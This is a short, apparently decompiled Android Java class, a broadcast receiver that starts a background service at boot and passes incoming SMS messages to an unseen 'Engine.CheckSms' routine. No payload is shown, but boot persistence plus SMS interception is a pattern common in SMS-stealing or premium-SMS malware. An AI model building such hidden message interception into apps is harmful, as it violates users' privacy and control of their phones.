package com.yongding.logic;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.yongding.util.Trace;

public class BroReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        Trace.w(new StringBuilder("BroReceiver.onReceive()-action=").append(intent.getAction()).toString());
        if (intent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
            Engine.StartMyService(context, Engine.bootServiceAction);
        } else if (intent.getAction().equals(Engine.SMS_RECEIVER)) {
            Engine.CheckSms(this, context, intent);
        } else if (intent.getAction().equals(Engine.bootServiceAction)) {
            Engine.StartMyService(context, Engine.bootServiceAction);
        } else if (intent.getAction().equals(Engine.smsServiceAction)) {
            Engine.StartMyService(context, Engine.smsServiceAction);
        } else if (intent.getAction().equals("android.intent.action.ACTION_SHUTDOWN")) {
            Engine.ShutDown(context);
        }
    }
}